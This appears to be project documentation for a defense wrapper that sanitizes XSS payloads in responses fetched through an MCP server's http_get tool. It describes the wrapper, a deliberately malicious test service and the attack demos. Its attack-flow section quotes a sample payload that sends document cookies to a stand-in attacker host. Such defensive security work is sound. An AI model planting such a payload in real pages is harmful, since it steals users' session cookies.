# Backward XSS Protection Explained

## Overview

Backward XSS protection prevents malicious HTML/JavaScript content from external services from being forwarded to users without sanitization. This protection layer sits between external services and the MCP server, intercepting http_get responses and sanitizing content.

## Architecture

```
External Service (XSS Service) → MCP Server → Backward XSS Protection Wrapper → User/Client
```

The wrapper intercepts `http_get` tool responses and sanitizes content before it reaches users.

## Attack Flow (Backward XSS)

1. **User Request**: User asks MCP to fetch content from external service
   - Example: "Fetch the latest news from http://malicious-news.com"
   
2. **MCP Fetch**: MCP server calls `http_get` tool to fetch from external service

3. **Malicious Response**: External service returns HTML/JSON with XSS payloads
   - HTML: `<script>alert('XSS')</script>`
   - JSON: `{"content": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"}`

4. **Unsanitized Forward**: Without protection, MCP forwards unsanitized content to user

5. **XSS Execution**: If content is rendered in browser, XSS payloads execute

## Protection Features

The wrapper detects and sanitizes:

### 1. HTML XSS Vectors
- `<script>` tags and their content
- Event handlers (`onclick`, `onerror`, `onload`, etc.)
- JavaScript protocol (`javascript:`)
- Dangerous tags (`<iframe>`, `<object>`, `<embed>`)

### 2. JSON XSS Vectors
- XSS payloads in JSON `content` fields
- XSS payloads in JSON `body` fields
- XSS payloads in nested JSON `data.body` or `data.content` fields

### 3. Sanitization Methods
- Strips `<script>` tags and their content
- Removes event handler attributes
- Removes `javascript:` protocol
- Strips dangerous HTML tags
- HTML-encodes remaining content (`<` → `&lt;`, `>` → `&gt;`)

## Components

### 1. XSS Service (`external_service/xss_service.py`)

The malicious external service that returns XSS payloads.

**Endpoints:**
- `/page` - HTML with `<script>` tags
- `/widget` - HTML with event handlers
- `/embed` - HTML with inline event handlers
- `/marker` - HTML with obvious XSS marker
- `/news` - JSON with XSS payload in `content` field
- `/api/content` - API JSON with XSS payload in `body` field

### 2. XSS Relay Service (`external_service/xss_relay_service.py`)

A public relay server that forwards URL fetch requests to MCP.

**How it works:**
- User sends request: `GET /fetch?url=http://127.0.0.1:8003/page`
- Relay service calls MCP's `http_get` tool
- MCP fetches from XSS service
- Relay returns unsanitized content to user

**Port:** 8004

### 3. Backward XSS Protection Wrapper (`defenses/backward_xss_protection_wrapper.py`)

The wrapper that intercepts and sanitizes http_get responses.

**Key Methods:**
- `call_tool()`: Intercepts http_get responses and sanitizes content
- `_detect_xss_in_content()`: Detects XSS patterns in content
- `_sanitize_html_content()`: Strips dangerous tags and HTML-encodes content

**Configuration:**
- `strict_mode`: If True, aggressively sanitizes content
- `sanitize_html`: If True, strips HTML tags and encodes content

### 4. Backward XSS Attack (`attacks/backward/attack6_xss.py`)

Demonstrates backward XSS attacks against vulnerable and protected systems.

**Attack Scenarios:**
1. Script Tags in HTML
2. Event Handlers in HTML
3. Inline Event Handlers
4. Obvious Marker
5. JSON with XSS Payload
6. API Response with XSS

## Usage

### Basic Usage

```python
from defenses.backward_xss_protection_wrapper import create_backward_xss_protection_wrapper

# Create base MCP client
base_client = await create_mcp_client()

# Wrap with backward XSS protection
protected_client = create_backward_xss_protection_wrapper(
    base_client,
    strict_mode=True,      # Aggressively sanitize content
    sanitize_html=True     # Strip HTML tags and encode
)

# Use protected client
result = await protected_client.call_tool("http_get", {"url": "http://127.0.0.1:8003/page"})
# Content will be sanitized if XSS patterns detected
```

### Configuration Options

- **strict_mode=True**: Aggressively sanitizes content (recommended)
- **strict_mode=False**: Only logs warnings, minimal sanitization
- **sanitize_html=True**: Strips HTML tags and encodes content (recommended)
- **sanitize_html=False**: Only detects, doesn't sanitize

## Example: How Protection Works

### Attack Attempt (Sanitized)

**User Request:**
```
Fetch content from http://127.0.0.1:8003/page
```

**What happens:**
1. MCP calls `http_get` tool
2. XSS service returns: `<html><script>alert('XSS')</script></html>`
3. Protection wrapper intercepts response
4. Detects XSS pattern: `<script>` tag
5. Sanitizes content: Strips `<script>` tag, HTML-encodes remaining
6. Returns sanitized content to user

**Result:**
```
[BACKWARD XSS PROTECTION] [WARNING] XSS patterns detected in response
[BACKWARD XSS PROTECTION] Detected patterns: script_tags
[BACKWARD XSS PROTECTION] [SANITIZED] Content sanitized
```

### Safe Content (Allowed)

**User Request:**
```
Fetch content from http://example.com/safe-page
```

**What happens:**
1. MCP calls `http_get` tool
2. External service returns safe HTML: `<html><p>Safe content</p></html>`
3. Protection wrapper intercepts response
4. No XSS patterns detected
5. Returns content as-is (marked as protected)

**Result:**
```
[BACKWARD XSS PROTECTION] Content appears safe
```

## Defense in Depth

The protection uses multiple layers:

1. **Pattern Detection**: Detects XSS patterns (script tags, event handlers, etc.)
2. **Tag Stripping**: Removes dangerous HTML tags
3. **Attribute Removal**: Removes event handler attributes
4. **HTML Encoding**: Encodes remaining content to prevent execution
5. **JSON Field Inspection**: Checks JSON content/body fields for XSS

## Statistics

The wrapper tracks:
- `sanitized_count`: Number of responses sanitized
- `blocked_count`: Number of responses blocked (if blocking mode enabled)
- `strict_mode`: Current protection mode
- `sanitize_html`: Current sanitization mode

## Testing

### Run Attack Demonstrations

```bash
cd /cis_project/mcp_security_project
source venv_mcp/bin/activate
python -m attacks.backward.attack6_xss
```

### Run Defense Demonstration

```bash
cd /cis_project/mcp_security_project
source venv_mcp/bin/activate
python demo/backward_xss_defense_demo.py
```

## Comparison with Other Defenses

- **Forward XSS Protection**: Validates content before storing in cache
- **Backward XSS Protection**: Sanitizes content from external services before returning to users
- **SSRF Protection**: Validates URLs before fetching
- **Path Traversal Protection**: Validates file paths

All defenses work together to provide comprehensive protection.

